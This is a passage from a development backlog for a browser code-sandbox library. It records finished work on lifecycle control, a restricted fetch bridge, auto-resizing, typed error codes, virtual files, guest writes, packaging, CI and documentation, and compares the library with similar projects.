`terminated`, so the events always agree with `state`. `terminated` fires once per termination;
`reset()` works from any state; removing the element tears it down (pending calls reject with
`TERMINATED`, state `idle`, no `terminated` event) and re-inserting rebuilds it. There is no
`running` state, since nothing reports when guest code finishes. The watchdog this item asked for
is S6's, done there. Decision in [ADR-003](ADR-003-lifecycle-and-liveness.md). Tests:
`test/e2e/lifecycle.spec.ts`, both modes.

**Verified**: teardown is private (`initialize()`, `_cleanupWorker()`); consumers have no
supported way to stop a runaway sandbox or to observe its state.

**Work**: public `terminate()` / `reset()`, a readonly state
(`idle → initializing → ready → running → terminated`), and the watchdog S6 needs. Supersedes the
state-machine sketch in `IMPROVEMENTS.md` §4 without the XState dependency.

**Acceptance**: `reset()` yields a fresh opaque origin; `terminated` fires exactly once.

### B3 · Per-instance events — fixes a live defect — ✅ **done**

**Done**: `sandbox-log` is dispatched on the element with `bubbles: true` (log lines and the worker
execution-timeout line). A listener on the element hears only its sandbox; a listener on `window`
still hears all of them, with the element as `event.target`, so no global mirror option was needed
([ADR-003](ADR-003-lifecycle-and-liveness.md)). `SandboxDevTools` listens on its element and prints
its sandbox's logs. Tests: `test/e2e/events.spec.ts` (two sandboxes, both modes; the timeout line;
DevTools output via a console spy in the host page).

**Verified**: logs dispatch on `window` (`src/host.ts:139`, `:156`, `:212`) while
`SandboxDevTools` filters `if (e.target !== this._sandbox) return;` (`src/devtools.ts:13`). The
target is always `window`, so **the filter drops every log and DevTools shows nothing**. Two
sandboxes on one page are also indistinguishable — which is why the playground listens globally
(`playground/playground.ts:78`) and why `test/e2e/local-html.spec.ts:30` works around it.

**Work**: dispatch `log` / `error` / `violation` / `terminated` on the element; keep a documented
opt-in global mirror for the playground.

**Acceptance**: with two sandboxes mounted, each receives only its own logs; DevTools output is
covered by a test.

### B4 · The library never registers its element — ✅ **done**

**Was**: `customElements.define(...)` appeared only in the playground, so a consumer importing the
bundle got an inert tag with no hint that registration was theirs to do.

**Done**: `defineWebSandbox(tagName = 'web-sandbox')` in `src/host.ts` registers the element,
is idempotent, and throws if the tag is taken by a different element. Importing still registers
nothing, so consumers can choose their own tag. The playground and the e2e harness use it.

**Open**: the D1 smoke test (mount a sandbox using only the public entry point) waits on D1.

### B5 · Host-mediated `sandbox.fetch` bridge — ✅ **done**

**Guarantee**: with `fetchBridge` configured, the guest's `sandboxFetch()` never reaches an origin that is
not listed exactly, never sends the host page's credentials or URL, never follows a redirect, never holds
more than the cap plus one chunk of a response or outlives its timeout or its environment, and every
request — refused, failed, aborted or answered — is reported once as a `fetch` event. Off (the default),
the guest's `sandboxFetch` (always present) rejects every request with `FETCH_NOT_ALLOWED`, refused by the
reserved method, and no `fetch` event is dispatched. The guest policy is unchanged.

**Done**, decided in [ADR-006](ADR-006-fetch-bridge.md): a library method under the reserved broker name
`sandbox:fetch` (ADR-002 amendment: `sandbox:` names live in their own registry, which `expose()` cannot
write; library codes travel only from a reserved method to the guest's broker). The policy and the request
discipline live in `src/lib/fetch-bridge.ts`, one bridge per environment, aborted by `_teardown`. Refusal
codes: `FETCH_NOT_ALLOWED`, `FETCH_BUSY`, `FETCH_REDIRECT`, `FETCH_TOO_LARGE`, `FETCH_TIMEOUT`,
`FETCH_FAILED`. Decisions taken here: a separate global, never a `fetch` polyfill; `redirect: 'manual'`
refused as `FETCH_REDIRECT` (no-follow like `'error'`, but distinguishable); headers from an allowlist (the
CORS-safelisted four plus listed names; `Cookie` never, `Authorization` only when listed), and a disallowed
header refuses rather than being dropped; methods `GET`/`HEAD`/`POST` by default; at most `maxConcurrent`
requests in flight, so memory is bounded by `maxConcurrent × maxBytes`; the request comes from the host
page, so targets see its origin (not its URL) and CORS applies for it. Tests: `src/lib/fetch-bridge.test.ts`,
`src/lib/rpc.test.ts`, `src/lib/in-sandbox-script.test.ts`, `test/unit/host.test.ts`, and
`test/e2e/fetch-bridge.spec.ts` on all three engines, against the recorder's ALLOWED and BLOCKED listeners
(T5; extended with echo, redirect, streamed and never-ending responses) and an echo on the harness origin
(`/__echo`, `vite.config.ts`), each refusal with a positive control. Mutation-checked: dropping
`credentials: 'omit'`, `redirect: 'manual'`, `referrerPolicy`, the abort on teardown, the body cap, the
allowlist, the header allowlist or the concurrency cap each fails a spec.

**Residuals**: DNS rebinding (a listed name resolving to a private address); the host origin in `Origin`;
receipt cost of a flood of refused requests (S6's open note); no streaming or guest `AbortSignal` in v1.

*Parity gap*: Zoid's strict bridge. *Motivated by* [finding 04](research/04_websocket_bypass/README.md)
(WebSockets bypass any SW-level logging) and [finding 09](research/09_monkey_patch_bypass/README.md)
(monkey-patching `fetch` is trivially undone).

**Current state**: no bridge. CSP controls *whether* a request is allowed but yields no record of
it, so the host has no traffic log.

**Work**: per `IMPROVEMENTS.md` §2 — expose `sandbox.fetch` over the port, default to
`connect-src 'none'` in bridged mode, polyfill `globalThis.fetch` onto it. Document the trade-off:
libraries reaching for a raw socket break, deliberately.

**Bridge discipline** — the bridge must grant no more than a direct guest request would. A
host-side `fetch` runs with the host page's authority, so by default it would send the host's
cookies, follow redirects past any allowlist, buffer without limit and outlive the call. Instead:

- `credentials: 'omit'` and `referrerPolicy: 'no-referrer'`; requests to the host page's own origin
  are refused unless allowlisted.
- `redirect: 'error'`.
- An exact-origin allowlist (v1 does not re-implement CSP source expressions).
- A body cap, read incrementally (`Content-Length` is checked first but never trusted).
- An `AbortController` tied to the call's timeout and to teardown.
- Loopback, private and link-local hosts (and `localhost` / `*.localhost`) refused unless
  allowlisted. A page cannot see DNS answers, so a public name that resolves to a private address
  is a documented limit, not a guarantee.
- Whole responses only in v1. If streaming is ever needed, it uses one dedicated port per request,
  so closing that port is the cancel — never chunk frames on the broker port.

**Acceptance**: every sandbox-initiated request appears in a host-side log; a direct `WebSocket`
is refused by CSP in bridged mode; a cookie set on the harness origin never reaches the echo
server; a redirect from an allowlisted origin to another origin is refused and the second origin
records no request; an oversized body rejects after reading at most the cap plus one chunk;
`reset()` during a slow response aborts the upstream request; every refusal carries a B7 code.

*Credit*: the no-redirect, timeout and size-cap discipline follows Dialog DB's `did:web` fetcher
([`dialog-did-web/src/fetch.rs`](https://github.com/dialog-db/dialog-db/blob/facd672/rust/dialog-did-web/src/fetch.rs));
the one-port-per-request stream shape follows Lunet
([`docs/lunet/data.js.flow`](https://github.com/Gozala/lunet/blob/master/docs/lunet/data.js.flow)).

### B6 · Content auto-sizing — ✅ **done**

**Guarantee**: with `autoResize: true` (iframe mode) the element's height follows the guest's content, and
nothing the guest posts can make the host write a height that is not a finite number in
[0, 100 000] px, write more than once per animation frame, or write more than 30 times a second; with it
off, nothing the guest posts changes the element.

**Done**: the guest bootstrap (`src/lib/in-sandbox-script.ts`) observes the root element (and the body,
once it exists) with a `ResizeObserver` and posts a changed height as a first-class `RESIZE` frame, outside
the broker like `VIOLATION` and `PING`. The measure is the root's box, which shrinks as well as grows (the
root's `scrollHeight` never reads less than the viewport), or the scroll height when content overflows the
viewport. The host's one path from a frame to a height is `startAutoResize` (`src/lib/auto-resize.ts`),
created per environment only when the config asks for it: `toResizeHeight` drops anything but a finite
number >= 0, rounds up and clamps to `AUTO_RESIZE_MAX_HEIGHT` (100 000); reports only record the newest
height, written at the next animation frame and no sooner than 1/30 s after the previous write
(`AUTO_RESIZE_MAX_UPDATES_PER_SECOND`), so the last report always lands. The height stays across rebuilds
until the new guest reports; a config without `autoResize` removes it. The feature literal reaches the
bootstrap only when on, so other sandboxes' documents are byte for byte unchanged. Worker mode: no effect,
one warning. Tests: `src/lib/auto-resize.test.ts` (validation, per-frame coalescing, the cap over ten
seconds of reports every frame, stop), `src/lib/in-sandbox-script.test.ts` (what is observed, what is
sent, off and worker mode), `test/unit/host.test.ts` (the literal), and `test/e2e/auto-resize.spec.ts` on
all three engines: growth and shrink within 6 host frames of the change (measured 2–4, including the
call's return trip), off by default with a forged report, malformed reports forged on the real port
dropped and huge ones clamped, a flood of 10 000+ forged reports bounded by both caps with the last one
written, a guest oscillating every frame leaves the host's frames and timers running, reset and turning
off, worker mode. Both rate tests fail with the cap removed.

**Residuals**: receiving the messages still costs host time (S6's open note); a guest whose root is
pinned to the viewport never shrinks the frame; content outside the root's box that does not overflow
the viewport is not measured; the element needs a non-inline `display`.

*Parity gap*: the headline feature of `cross-origin-html-embed`; Zoid ships it too.
**Verified**: the iframe is pinned to `width:100%;height:100%` (`src/host.ts:224`).
**Work**: a `ResizeObserver` inside the sandbox reporting `scrollHeight` over the port, opt-in via
`autoResize`. **Acceptance**: host element height tracks content within one frame.

### B7 · Refusals carry a reason only the local side can set — ✅ **done**

**Done**: every rejection from the broker and from the element's `call()`/`callWithTimeout()` is an
`Error` with a `code` from the closed set below, minted in `src/lib/rpc.ts`; the element's own
termination refusals take theirs from the broker too. A guest throwing the host's termination text
with `code: 'TERMINATED'` rejects the host's call with `HANDLER_ERROR`. The decision
is recorded in [ADR-002](ADR-002-host-guest-broker.md#amendment-2026-10-11-refusals-carry-a-code).
The acceptance below holds in both modes: `test/e2e/broker.spec.ts` (refusals asserted by exact
code, guest-to-host ones from inside the guest), plus `src/lib/rpc.test.ts` (every code path,
forged response codes, and the pinned code strings).

**Guarantee**: nothing the other side sends can produce a rejection that looks like one of the
library's own (timeout, termination, non-transferable value, failed send).

**Verified**: every rejection is a plain `Error` carrying a string. A guest handler's error text
becomes the host's `Error.message` verbatim (`src/lib/rpc.ts:156`), and the library's own refusals
carry no marker (`src/host.ts:167`, `:173`, `:270`; `src/lib/rpc.ts:130`, `:189`). So a guest can
throw the exact text of a termination refusal, and host code that matches strings to decide
"stop" or "retry" acts on a reason the guest chose. Tests assert substrings (`rpc.test.ts:72`,
`broker.spec.ts:110`) or only that a call did not resolve (`broker.spec.ts:149`).

**Work**: one string `code` property on every rejection, from a closed set in two disjoint groups.
`TIMEOUT`, `TERMINATED`, `ARGS_NOT_TRANSFERABLE`, `SEND_FAILED` and `INVALID_CALL` are set only by
the local side. A failure reported by the other side gets `UNKNOWN_METHOD`, `HANDLER_ERROR` or
`RESULT_NOT_TRANSFERABLE`: the wire code is clamped on receipt, and anything else becomes
`HANDLER_ERROR`. `RPC_RES` gains an optional `code`. A plain property, not an `Error` subclass, so it survives the broker being stringified into
the guest and works across realms. Retry-or-stop follows from the code: only `TIMEOUT` is worth
retrying, and `TERMINATED` only after the next `ready`.

**Acceptance**: a guest response carrying `code: 'TERMINATED'`, or the termination text, rejects
the host's call with `code === 'HANDLER_ERROR'`. Every refusal test asserts the exact `code` rather
than message text, runs as the refused side (from inside the guest for guest-to-host refusals), and
asserts that no handler ran. One test pins the code strings, since they are wire protocol.

**Files** ([ADR-004](ADR-004-files-as-blob-urls.md)) use the same shape outside `RpcErrorCode`, since
no broker is involved: `registerFiles()` / `unregisterFiles()` throw `INVALID_PATH`, `INVALID_FILE` or
`FILES_QUOTA_EXCEEDED`, and the guest's `sandboxFiles` lookups throw or reject with `NOT_FOUND`, minted
in the guest. The strings are pinned in `src/lib/files.test.ts` and `test/e2e/files.spec.ts`.

*Credit*: typed refusal reasons, and the rule for testing refusals, come from Dialog DB
([`dialog-capability/src/access.rs`](https://github.com/dialog-db/dialog-db/blob/facd672/rust/dialog-capability/src/access.rs),
[`.claude/rules/authority-tests.md`](https://github.com/dialog-db/dialog-db/blob/facd672/.claude/rules/authority-tests.md)).
Their separate retry/stop field is not adopted: here it follows from the code.

---

### B8 · Behaviour the API reference surfaced — ✅ **done**

*Found while writing [`API.md`](API.md) (D3), where the code and its comments or the README disagreed.*

- `workerExecutionTimeout` rebuilds the environment N ms after the last `execute()` even when that code has
  finished; the warning says it terminates, yet no `terminated` event fires and the state returns to `loading`
  (`src/host.ts`, `execute()`). Decide: a budget for code still running, or a documented idle reset.
- `execute()` on an element not yet in the document is dropped silently on insertion, while `call()` in the same
  state rejects with `TERMINATED`. One rule for both.
- The guest's `console.info` is not relayed (`log`, `warn`, `error` are), and uncaught guest errors reach the host
  only in strict mode.
- `VIEW_LIVENESS_TIMEOUT_MS` is exported from `host.ts` but not from the package entry.
- `setConfig()` applies over the defaults, not the previous config, so it also clears `html` from `load()`:
  documented as is; kept.

**Acceptance**: each behaviour is one rule, documented in `API.md`, with a test.

**Done** (2026-10-14, [ADR-003 amendment](ADR-003-lifecycle-and-liveness.md#amendment-2026-10-14-one-rule-per-budget-build-and-missing-environment)):
- `workerExecutionTimeout` is a budget, not an idle reset: each `execute()` has its own deadline, at which the
  guest's event loop must be free; the host pings the bootstrap's captured handler and, without an answer within
  `EXECUTION_TIMEOUT_GRACE_MS`, ends the sandbox (`Execution Timeout` host line, then `terminated` with
  `the executed code ran longer than workerExecutionTimeout`). The guest reports nothing (S30 replaced the first
  version's `EXECUTED` report, which guest code could send early). Decision: terminate, as the watchdog does; one
  rule for every budget. Tests: `test/unit/followup-guarantees.test.ts`, `test/e2e/worker-timeout.spec.ts`,
  `test/e2e/focused-review.spec.ts` ("F2").
- While `idle` or `terminated`, `call()` rejects at once with `TERMINATED` and `execute()` warns and does nothing.
  Decision: refuse at once, since work belongs to an environment and there is none (a call already rejected on
  insertion; queuing across it would contradict "every build rejects pending work"). Tests: the same unit file,
  `test/e2e/review-followup.spec.ts`.
- `console.info` is relayed (level `info`) in every mode. Uncaught guest errors still reach the host only in strict
  mode (default modes have no such hook to rely on); left as documented.
- `VIEW_LIVENESS_TIMEOUT_MS` is exported from the package entry and listed in `API.md` Limits.

---

## C · Virtual Files

Decided in [ADR-004](ADR-004-files-as-blob-urls.md): files are registered on the element and reach
the guest as `blob:` URLs created in its own realm. The Service-Worker hub is gone (Rejected, below).

### C1 · In-sandbox VFS API — ✅ **done**

**Done** (2026-10-13): the guest global `sandboxFiles` with `list()`, `url(path)`, `read(path)` and
`text(path)`, in iframe and worker mode, built by the bootstrap from a snapshot the host embeds as one
inline literal (`src/lib/in-sandbox-files.ts`). Host side: `registerFiles()`, `unregisterFiles()`,
`listFiles()` and `fileschanged` with `{ paths }` (`src/lib/files.ts`). Paths are validated, never
normalised, and the guest's lookup is an exact `Map` lookup, so every other spelling is `NOT_FOUND`.
Writes moved to C5. Tests: `src/lib/files.test.ts`, `src/lib/in-sandbox-files.test.ts`,
`test/unit/files.test.ts`, and `test/e2e/files.spec.ts` on Chromium, Firefox and WebKit (every load
type, containment, isolation, no egress, lifecycle, worker mode).

**Done** (2026-10-13), markup references: `<script src>`, stylesheet/icon/preload/modulepreload
links, `src` of `img`/`source`/`video`/`audio`/`track` and `video[poster]` in guest markup that
resolve, against `https://vfs.invalid/index.html`, to a registered path. Host-side `DOMParser` rewrite
to per-build sentinels (`src/lib/markup-references.ts`); the bootstrap `document.write`s the markup
with the guest's own `blob:` URLs as its last statement, keeping parser order and the CSP-first rule
(S2). No match keeps the markup verbatim (byte-identical document); a query or fragment, another
spelling or an unregistered path stays as written and fails closed with no request. Iframe mode only,
and only when the bootstrap can run. Rejected: `<base href>`, a `MutationObserver` swap, inlining
contents, a guest-side parser. Decisions and fidelity notes: [ADR-004, amendment](ADR-004-files-as-blob-urls.md#amendment-markup-references-2026-10-13).
Tests: `src/lib/markup-references.test.ts`, `test/unit/files.test.ts`, `test/e2e/files.spec.ts`
section 8 on all three engines.

**Done** (2026-10-13), module graph: relative specifiers (`./`, `../`, `/`) in static imports,
`export … from`, `export * from`, side-effect imports and literal `import()` of registered JavaScript
files are rewritten at registration, host-side, to `https://vfs.invalid/<path>` URLs
(`src/lib/module-specifiers.ts`), with es-module-lexer's asm.js build (`es-module-lexer/js`: sync, no
WebAssembly), pinned at 1.7.0 as a dev dependency and bundled into `dist` (owner-approved; MIT notice in
`THIRD_PARTY_NOTICES.md`). Inline `<script type="module">` in guest markup is rewritten the same way.
The bootstrap registers exactly one import map from those URLs to the guest's `blob:` URLs before any
markup, so a module reached by `blob:` URL and by virtual URL is evaluated once; a guest inline import
map is merged into it on the host and taken out of the markup (`src/lib/import-map.ts`), so it behaves
the same in every engine. `read()`/`text()` return the bytes as registered (the rewrite travels as byte
edits); the quota counts what the rewrite adds. Computed `import()`, `new URL(…, import.meta.url)`,
module workers and module graphs in worker mode stay unsupported and fail closed; a file the lexer
cannot parse is delivered unchanged with a warning. Decisions: [ADR-004, module graph amendment](ADR-004-files-as-blob-urls.md#amendment-module-graph-2026-10-13).
Tests: `src/lib/module-specifiers.test.ts`, `src/lib/import-map.test.ts`, `src/lib/files.test.ts`,
`src/lib/in-sandbox-files.test.ts`, `src/lib/markup-references.test.ts`, `test/unit/files.test.ts`,
`test/e2e/files.spec.ts` section 9 on all three engines.

**Done** (2026-10-13), CSS references and `srcset`: `url()` and `@import` in registered `text/css`
files (resolved against the file's own path) and in inline `<style>` and `style=""` (against
`https://vfs.invalid/index.html`), plus `@font-face` `src` and `image-set()`, found by a host-side
tokenizer that follows the CSS Syntax tokenizer (`src/lib/css-references.ts`, no dependency); `srcset`
of `img` and `source` split as the HTML standard does (`src/lib/srcset.ts`). A stylesheet's references
are stored as byte ranges at registration and become slots per build for the files registered then; the
guest fills each with a CSS string holding its own `blob:` URL, one pass in the snapshot's dependency
order (files without slots first, then each stylesheet after the files it names). Every reference on a
cycle (strongly connected component, self-imports included) is left as written with one warning, so
the guest never loops and the rest of each sheet applies. `read()`/`text()` keep the registered bytes;
the quota counts path + 72 bytes per reference that could name a file. Queries, fragments,
unregistered paths and run-time URLs stay as written and fail closed with no request. No policy change.
Decisions and per-engine measurements: [ADR-004, CSS amendment](ADR-004-files-as-blob-urls.md#amendment-css-references-and-srcset-2026-10-13).
Tests: `src/lib/css-references.test.ts`, `src/lib/srcset.test.ts`, `src/lib/files.test.ts`,
`src/lib/in-sandbox-files.test.ts`, `src/lib/markup-references.test.ts`, `test/unit/files.test.ts`,
`test/e2e/files.spec.ts` section 10 on all three engines.

**Done** — all four δ steps of [ADR-004](ADR-004-files-as-blob-urls.md) are in: the store, snapshot
and policy with `sandboxFiles` in both modes (replacing the Service Worker); markup references written
by the bootstrap; the module graph through one import map; and CSS references with `srcset`. What stays
out is listed in the ADR's "Not supported" sections (`<template>` contents, URLs built at run time,
module workers); writes are C5.

**Verified** (2026-08-29, kept as a record): one-way only. The host pushed with `registerFiles()`;
sandboxed code could *load* files through the `<base>` tag but could not list, read or write them.
[`RESEARCH_VFS_ACCESS.md`](research/RESEARCH_VFS_ACCESS.md) specified the API.

**Acceptance**: sandboxed code reads and lists files. Containment: `list()` returns only this
instance's entries, with guest-relative names (no session id, host path or other instance's names); a
read through `../`, an encoded traversal, an absolute path or another instance's path rejects with the
same code as a missing file, and the store is unchanged. This inherits S3's cross-instance guarantee.
Met for reads; the write half is C5's.

*Credit*: the guest sees only what it was granted, never names or origins — Lunet's data model
([Readme](https://github.com/Gozala/lunet#readme)). Its encryption at rest is not adopted: with the
key stored beside the data on the same origin, it protects nothing.

### C2 · MIME types and binary files — ✅ **done**

**Done** (2026-10-13): a case-insensitive extension table of about 30 types, never empty (unknown is
`application/octet-stream`: an empty type is applied as a stylesheet by every engine), with a
`{ content, type }` override checked against a `type/subtype` pattern. Strings are stored as UTF-8
and `Uint8Array`s are copied at registration. The guest's blobs carry the type, and `files.spec.ts`
asserts each blob's type against the table and a byte-exact round trip of all 256 byte values.

**Verified** (kept as a record), two defects in `src/virtual-files/sw.ts`: every response was served
as `text/javascript`, and `fileCache` was a `Map<string, string>` although `registerFiles()`
advertised `Record<string, string | Uint8Array>`. Binary registration was broken at the type boundary.

### C3 · File lifecycle and cap — ✅ **done**

**Done** (2026-10-13): files belong to the element and live until `unregisterFiles()` or garbage
collection; each environment build snapshots them. The guest's blobs belong to its document or
worker, so teardown — `reset()`, `terminate()`, removal — destroys the realm and frees them; there is
no session state left behind anywhere. The cap is enforced atomically in `registerFiles()` against
the store the batch would produce: 8 MiB in total, at most 1000 files, paths of at most 256
characters, as module constants. Measured on 2026-10-13 to load byte-exact in all three engines in
both modes (they also loaded 64 MiB, with time to `ready` growing to 4.6–17 s); raise the constants
only after `files.spec.ts` section 7 passes at the new value everywhere. Memory is about 3–3.5× the
file bytes across host and guest.

*The lesson of [finding 08](research/08_session_exhaustion/README.md), applied client-side.*
**Verified** (kept as a record): `fileCache` grew without bound and was never pruned; entries keyed by
a dead session id outlived the sandbox for the Service Worker's lifetime.

### C5 · Guest writes — ✅ **done**

**Guarantee**: a guest can change files only when the embedder opted in, and never past the host's
path rules and cap.

**Done** (2026-10-14, [ADR-004 amendment](ADR-004-files-as-blob-urls.md#amendment-guest-writes-2026-10-14)):
`guestWrites: true` (only a literal `true`) gives `sandboxFiles.write(path, entry)` and `remove(path)` a host behind
them: the reserved broker method `sandbox:write` (not the raw `FS_WRITE` frame sketched below: the reserved
namespace already makes a library method unreplaceable, guest code can no longer post frames at all, and the
broker brings correlation, timeouts, `TERMINATED`, the in-flight cap, the current-port check and the code clamp),
called through the bootstrap's captured `callWithTimeout`, and bound per build to that environment's overlay
(`src/lib/guest-writes.ts`). Off, both methods reject `FILES_NOT_ALLOWED` without sending, and the host's method
refuses with the same code. Every write is checked by `CheckedFile.from()` and `FileStore.check()` against the
store with the overlay applied; `FileStore.apply({ put, remove })` is now the store's one mutation, and
`registerFiles()`, `unregisterFiles()` and `commitGuestWrites(paths, options?)` are wrappers. The guest sees its
writes in `list()`/`read()`/`text()` only after the host's answer; `url()` of a written path is `NOT_FOUND`, so no
`blob:` URL is ever minted for one (C1's guarantee holds by construction). The host lists them
(`listGuestWrites()`), hears `fileswritten` (bubbling, dispatched last through `_notifyThenAct`), and commits an
explicit list; a type not on the inert list (images, fonts, audio, video, `text/plain`, `application/json`,
`text/css`, as the store types the file) needs `{ code: true }`, else `FILES_NOT_ALLOWED`. New library codes
`INVALID_PATH`, `INVALID_FILE`, `FILES_QUOTA_EXCEEDED`, `FILES_NOT_ALLOWED`, `FILES_BUSY`; `FetchErrorCode` is the
`FETCH_*` subset. At most `GUEST_WRITES_PER_SECOND` (100) requests and `GUEST_WRITE_BYTES_PER_SECOND` (8 MiB) per
environment and second (`FILES_BUSY`). Builds and removal discard the overlay; every termination keeps it, closed.
Tests: `src/lib/guest-writes.test.ts`, `src/lib/files.test.ts`, `src/lib/in-sandbox-files.test.ts`,
`src/lib/in-sandbox-script.test.ts`, `src/lib/rpc.test.ts`, `test/unit/guest-writes.test.ts`,
`test/unit/strict.test.ts`, `test/unit/api-docs.test.ts`, and `test/e2e/guest-writes.spec.ts` (iframe, worker and
strict mode on all three engines). Not in v1: rename or move.

*Kept as the original plan:*

**Work**: an opt-in `FS_WRITE` frame on the port, handled before the broker (like the watchdog's
`PING`), so it is not a callable method a guest could replace. The host validates the path and the
quota exactly as `registerFiles()` does. The guest's writes form an overlay that `reset()` discards
unless the host commits it. Opt-in, because otherwise a guest could plant code that the next
environment runs.

**Acceptance**: without the opt-in, a write rejects and the store is unchanged; with it, a write
through `../`, an encoded path or past the cap is refused with the same codes as `registerFiles()`;
an uncommitted overlay is gone after `reset()`, and a committed one fires `fileschanged`.

---

## D · Packaging & Distribution

### D1 · Ship an installable package — 🟡 **ready except the licence**

**Done**: public entry `src/index.ts`; `exports` / `types` / `main` point at `dist/`, built by
`bun run build:lib` (bun bundle + `tsc` declarations). `scripts/smoke-package.sh` runs `bun pm pack`,
installs the tarball into a scratch project, type-checks and bundles a consumer (CI). The e2e spec
`test/e2e/package.spec.ts` mounts a sandbox from `dist/` under a custom tag. **Open**: `private: true`
stays until H5's licence is chosen.

Every solution we compare against installs with one command. We do not install at all, which caps
adoption regardless of how good the isolation is.

**Verified in `package.json`**: `"private": true`; `"main": "dev-server.ts"` — **a file that does
not exist**; no `exports`, no `types`; `build-dist` emits JS without declarations. `README.md`
also documents a `server.ts` that does not exist (the dev server is a Vite plugin in
`vite.config.ts`).

**Work**: drop `private`, add `exports` + `types` with declaration emit, fix `main`, align the
README with the real entry points.

**Acceptance**: a packed tarball imports cleanly in a scratch project with working types, and a
smoke test mounts a sandbox through the public entry point (with B4).

### D2 · CI — ✅ **done**

**Done**: `.github/workflows/ci.yml` runs unit tests and both builds, and the e2e suite on Chromium,
Firefox and WebKit, on push to `main` and on every PR. The type check now gates CI too (H3).

**Verified**: `playwright.config.ts` defines chromium, firefox and webkit projects and
[`BROWSER_COMPATIBILITY.md`](research/BROWSER_COMPATIBILITY.md) makes claims about all three — but
there is no `.github/` directory, so nothing runs on merge. This is what allowed T1–T3 to rot
undetected.

**Work**: a workflow running unit + e2e (+ `tsc --noEmit` once H3 lands) on push and PR.
**Acceptance**: reverting any mitigation fails the PR. Order this immediately after T1–T3, or the
same drift recurs.

### D3 · API reference — ✅ **done**

**Done**: [`API.md`](API.md) documents the current public surface: registration, the element and its
`state`, every `SandboxConfig` option (type, default, modes), `connectionsAllowed` rules and `fetchBridge`
fields, every method with its rejections, the events and their detail shapes, the lifecycle, the refusal codes
(local vs reported), the guest globals per mode, the limits, the exports and examples. It links the ADRs for
the reasoning. `test/unit/api-docs.test.ts` derives the surface from the code (exports, config and detail
interfaces, methods, dispatched events, codes, termination reasons, guest globals, limits and their values)
and fails when the reference and the code drift apart. TSDoc on `SandboxConfig`, the element's methods and
the file types filled in. Linked from `README.md` and `docs/README.md`.

Framework adapters (React/Vue wrappers) were part of this item and are out of scope by the owner's decision
(Rejected, below).

Original scope: document the public surface once B1–B4 stabilise it; thin React/Vue wrappers around the element.
**Acceptance**: a consumer can integrate from the docs without reading `host.ts`.

---

## H · Repo & Docs Hygiene

### H1 · Duplicate documents — ✅ **done**

**Done**: `research/ARCHITECTURE_COMPARISON.md` and `research/VIRTUAL_FILES_SECURITY_ANALYSIS.md` are
kept; their byte-identical twins are now stubs pointing at them. The VFS overlap below remains.

**Verified byte-identical pairs**:
- `docs/research/VIRTUAL_FILES_SECURITY_ANALYSIS.md` ≡ `docs/research/Virtual-Files-Security-Architecture.md`
- `docs/Sandbox_Architecture_Decision.md` ≡ `docs/research/ARCHITECTURE_COMPARISON.md`

Plus heavy overlap between `VFS_ARCHITECTURE.md`, `VIRTUAL_FILES_PLAN.md` and
`RESEARCH_VFS_ACCESS.md`. **Work**: keep one of each pair, leave a stub pointing at it.

### H2 · Naming drift — ✅ **done**

**Was**: four names for one project — `lofi-sandbox` (the element), `lofi-web-sandbox` (the package),
`iframe-sandbox` (older docs) and "Lofi Sandbox" (prose).

**Done**: one name, **web-sandbox**: the repository, the package, the default element
`<web-sandbox>` and the class `WebSandbox`; "Web Sandbox" in prose. `iframe-sandbox` remains only
in research write-ups that describe that older architecture.

### H3 · Type check is not part of the build — ✅ **done**

**Done**: `bun run typecheck` is clean and gates CI. The playground's `window` surface is typed,
`sw.ts` has its own `tsconfig.worker.json`, `test/` and the research specs are included, `baseUrl` is
gone (TypeScript 7 removed it), and the `CSPDirectives` test import is fixed. Fixing the types also
surfaced that `setConfig()` demanded a complete config; it now takes `Partial<SandboxConfig>`.

**Verified**: `bun x tsc --noEmit` reports 91 errors — 84 in `playground/playground.ts` (untyped
`window.*` globals, unasserted `querySelector`), 6 in `sw.ts` (needs `lib: ["WebWorker"]`), and one
real bug: `src/lib/csp/csp-generator.test.ts:2` imports `CSPDirectives` from `./csp-generator`,
which does not export it. `src/host.ts` itself is clean. `tsconfig.json` also excludes `test/**`
from `include`, and `baseUrl` is deprecated for TS 7.

**Work**: type the playground's window surface, split a worker tsconfig for `sw.ts`, fix the test
import, include `test/`, replace `baseUrl` with relative paths. **Acceptance**: `tsc --noEmit` is
clean and runs in CI.

### H4 · Research index — ✅ **done**

`docs/research/README.md` now indexes all twelve findings with a per-finding status against the
current opaque-origin architecture, distinguishing "closed by construction" from "open". A
`docs/README.md` index was added alongside it.

### H5 · Missing repo basics — 🟡 **partly done**

**Done**: `CONTRIBUTING.md`; `format` / `format:check` scripts; `.prettierrc` stripped of the Svelte
and Tailwind plugins it was copied with. `format:check` is not a CI gate yet (101 files predate the
config). **Open**: the `LICENSE` — the owner's choice, and it still blocks dropping `private` (D1).

No `LICENSE`, no `CONTRIBUTING.md`, and `.prettierrc` exists with no `format` script and no
formatting check. **Work**: add a license (blocks D1 — publishing without one is a non-starter),
a short contributing note, and `format` / `format:check` scripts.

---

## Parity Reference

Where the items above come from. This table covers the solutions named in the repo's original
comparisons; for the 2026 entrants (`quickjs-wasi`, `@tanstack/ai-isolate-quickjs`, `zushi`,
`lifo`, BrowserPod) see the
[field scan in ADR-001](ADR-001-continue-or-adopt.md#field-scan--august-2026). Legend: ✅ shipped · 🟡 partial · ❌ missing · ➖ n/a by design.

| Capability | web-sandbox | websandbox | Penpal | Zoid | cross-origin-embed |
| :--- | :---: | :---: | :---: | :---: | :---: |
| Isolation with no server config | ✅ opaque origin | 🟡 | ➖ | ➖ | ❌ wildcard DNS |
| Private `MessageChannel` | ✅ | ❌ | 🟡 | ✅ | ❌ |
| Promise-based RPC | ✅ **B1** | ✅ | ✅ | ✅ | ➖ |
| Typed package / `d.ts` | 🟡 **D1** | ✅ | ✅ | ✅ | ✅ |
| Headless (worker) execution | ✅ **S1** | ❌ | ❌ | ❌ | ❌ |
| Virtual files | ✅ **C1** | ❌ | ➖ | ❌ | ❌ |
| Host-mediated network | ✅ **B5** | ❌ | ➖ | ✅ | ❌ |
| Auto-sizing | ✅ **B6** | ❌ | 🟡 | ✅ | ✅ |
| Execution quotas | ✅ **S6** (time, strict mode; memory open) | ❌ | ➖ | ❌ | ➖ |

We lead on four rows: isolation without server config, headless (worker) execution and virtual
files outright, and execution quotas as the only solution with any support (a time bound on every
engine in strict mode; memory is still open). Those four,
plus the private channel (matched only by Zoid), are the rows the backlog must not regress.

Larger bets that follow from the same comparison, both **P3**: an **opt-in host-served mode** that
delivers CSP as an HTTP **header** while keeping the opaque origin via the `sandbox` attribute —
which closes S7, S8 and most of S2 at once, and needs no wildcard DNS (see
